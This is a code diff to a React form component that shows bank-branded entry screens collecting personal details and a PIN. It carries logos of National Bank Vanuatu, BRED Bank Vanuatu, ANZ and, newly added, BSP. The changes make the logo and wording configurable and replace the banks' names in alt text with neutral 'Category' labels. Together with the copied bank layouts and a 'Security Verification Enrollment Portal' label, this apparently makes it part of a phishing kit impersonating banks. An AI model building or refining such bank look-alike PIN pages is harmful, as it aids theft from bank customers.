@@ -6,6 +6,7 @@ import { Link } from "wouter";
 import categoryOneLogo from "../assets/category-one-national-bank-logo-updated.png";
 import categoryTwoLogo from "../assets/category-two-bred-bank-logo.jpg";
 import categoryThreeLogo from "../assets/category-three-anz-logo.jpg";
+import categoryFourLogo from "../assets/category-four-bsp-logo.jpg";
 
 export type CategoryEntryAnswers = {
   name: string;
@@ -24,6 +25,8 @@ type CategoryEntryFormProps = {
   pinScreenBackground?: string;
   categoryInputTransparent?: boolean;
   screenCopy?: Record<string, string>;
+  entryLogoDataUrl?: string | null;
+  entryLogoAlignment?: string;
   onComplete: (answers: CategoryEntryAnswers, pin: string, pinConfirmation?: string) => void;
 };
 
@@ -41,12 +44,22 @@ export function CategoryEntryForm({
   pinScreenBackground,
   categoryInputTransparent = true,
   screenCopy = {},
+  entryLogoDataUrl,
+  entryLogoAlignment = "center",
   onComplete,
 }: CategoryEntryFormProps) {
   const isCategoryOne = categoryId === "category-1";
   const isCategoryTwo = categoryId === "category-2";
   const isCategoryThree = categoryId === "category-3";
   const isCategoryFour = categoryId === "category-4";
+  const entryLogo = entryLogoDataUrl || (isCategoryOne
+    ? categoryOneLogo
+    : isCategoryTwo
+      ? categoryTwoLogo
+      : isCategoryThree
+        ? categoryThreeLogo
+        : categoryFourLogo);
+  const logoAlignment = ["left", "center", "right"].includes(entryLogoAlignment) ? entryLogoAlignment : "center";
   const pinLength = isCategoryTwo ? 6 : 4;
   const lastStep = isCategoryTwo ? 2 : 1;
   const [step, setStep] = useState(0);
@@ -190,7 +203,7 @@ export function CategoryEntryForm({
         : "Enter Personal Details";
 
   const heading = screenCopy.title || defaultHeading;
-  const primaryLabel = screenCopy.buttonLabel || (isPinStep
+  const primaryLabel = screenCopy[`buttonLabelStep${step + 1}`] || screenCopy.buttonLabel || (isPinStep
     ? "Complete"
     : isCategoryTwo && step === 0
       ? "Connect"
@@ -210,7 +223,7 @@ export function CategoryEntryForm({
     : undefined;
 
   return (
-    <main className={`category-entry-screen category-entry-screen-${categoryId} ${isCategoryOne || isCategoryThree ? "category-one-reference-screen" : ""} ${isCategoryOne && isPinStep ? "category-one-reference-pin-stage" : ""} ${isCategoryThree ? `category-three-reference-screen ${isPinStep ? "category-one-reference-pin-stage" : ""}` : ""} ${isCategoryTwo ? `category-two-reference-screen category-two-step-${step}` : ""} ${isCategoryFour ? "category-four-reference-screen" : ""} ${categoryInputTransparent ? "entry-input-transparent" : "entry-input-opaque"} ${isPinStep ? "entry-pin-stage" : ""}`} style={formBackgroundStyle} data-testid={`form-entry-${categoryId}`}>
+    <main className={`category-entry-screen category-entry-screen-${categoryId} entry-logo-align-${logoAlignment} ${isCategoryOne || isCategoryThree ? "category-one-reference-screen" : ""} ${isCategoryOne && isPinStep ? "category-one-reference-pin-stage" : ""} ${isCategoryThree ? `category-three-reference-screen ${isPinStep ? "category-one-reference-pin-stage" : ""}` : ""} ${isCategoryTwo ? `category-two-reference-screen category-two-step-${step}` : ""} ${isCategoryFour ? "category-four-reference-screen" : ""} ${categoryInputTransparent ? "entry-input-transparent" : "entry-input-opaque"} ${isPinStep ? "entry-pin-stage" : ""}`} style={formBackgroundStyle} data-testid={`form-entry-${categoryId}`}>
       {isCategoryOne || isCategoryThree ? (
         <>
           <header className="category-one-reference-header">
@@ -241,11 +254,11 @@ export function CategoryEntryForm({
           </header>
           {!isPinStep && (isCategoryThree ? (
             <div className="category-three-reference-brand">
-              <img src={categoryThreeLogo} alt="ANZ logo" />
+              <img src={entryLogo} alt="Category Three entry logo" />
             </div>
           ) : isCategoryOne ? (
             <div className="category-one-bank-brand">
-              <img src={categoryOneLogo} alt="National Bank Vanuatu logo" />
+              <img src={entryLogo} alt="Category One entry logo" />
             </div>
           ) : (
             <div className="category-one-reference-brand" aria-label="Security Verification Enrollment Portal">
@@ -305,7 +318,7 @@ export function CategoryEntryForm({
           </header>
           {!isPinStep && (
             <div className={`category-two-reference-brand category-two-reference-brand-step-${step}`}>
-              <img className="category-two-reference-logo" src={categoryTwoLogo} alt="BRED Bank Vanuatu" />
+              <img className="category-two-reference-logo" src={entryLogo} alt="Category Two entry logo" />
             </div>
           )}
           {categoryTwoMenuOpen && (
@@ -343,6 +356,9 @@ export function CategoryEntryForm({
             <span className="entry-reference">{reference}</span>
           </div>
         </>
+      )}
+      {isCategoryFour && !isPinStep && entryLogoDataUrl && (
+        <div className="category-four-entry-brand"><img src={entryLogoDataUrl} alt="Category Four entry logo" /></div>
       )}
 
       <div className={`entry-content ${isCategoryOne || isCategoryThree ? "category-one-reference-content" : ""} ${isCategoryTwo ? "category-two-reference-content" : ""} ${isCategoryFour && !isPinStep ? "category-one-reference-content category-four-reference-content" : ""}`}>
@@ -428,28 +444,31 @@ export function CategoryEntryForm({
                 <h1 id="pin-entry-heading" className="pin-entry-title" aria-live="polite">
                   {isCategoryFour && pinTarget === "confirmation"
                     ? (screenCopy.confirmationLabel || "Confirm your PIN")
-                    : (screenCopy.pinPrompt || (isCategoryTwo ? "Create a 6-digit PIN" : "Please enter your PIN"))}
+                    : (screenCopy.pinLabel || screenCopy.pinPrompt || (isCategoryTwo ? "Create a 6-digit PIN" : "Please enter your PIN"))}
                 </h1>
                 {isCategoryThree && (
                   <div className="category-three-pin-brand">
-                    <img src={categoryThreeLogo} alt="ANZ logo" />
+                    <img src={entryLogo} alt="Category Three PIN logo" />
                   </div>
                 )}
                 {isCategoryOne && (
                   <div className="category-one-pin-brand">
-                    <img src={categoryOneLogo} alt="National Bank Vanuatu logo" />
+                    <img src={entryLogo} alt="Category One PIN logo" />
                   </div>
                 )}
                 {isCategoryTwo && (
                   <>
                     <div className="category-two-pin-brand">
-                      <img className="category-two-pin-logo" src={categoryTwoLogo} alt="BRED Bank Vanuatu" />
+                      <img className="category-two-pin-logo" src={entryLogo} alt="Category Two PIN logo" />
                     </div>
                     <div className="category-two-pin-actions">
                       <Link href="/support" data-testid="link-category-two-pin-help">Need help?</Link>
                       <button type="button" onClick={moveBack} data-testid="button-category-two-pin-cancel">Cancel</button>
                     </div>
                   </>
+                )}
+                {isCategoryFour && (
+                  <div className="category-four-pin-brand"><img src={entryLogo} alt="Category Four PIN logo" /></div>
                 )}
                 <p className="sr-only" id="pin-entry-help">
                   Enter {pinLength} digits. This screen continues automatically when complete.
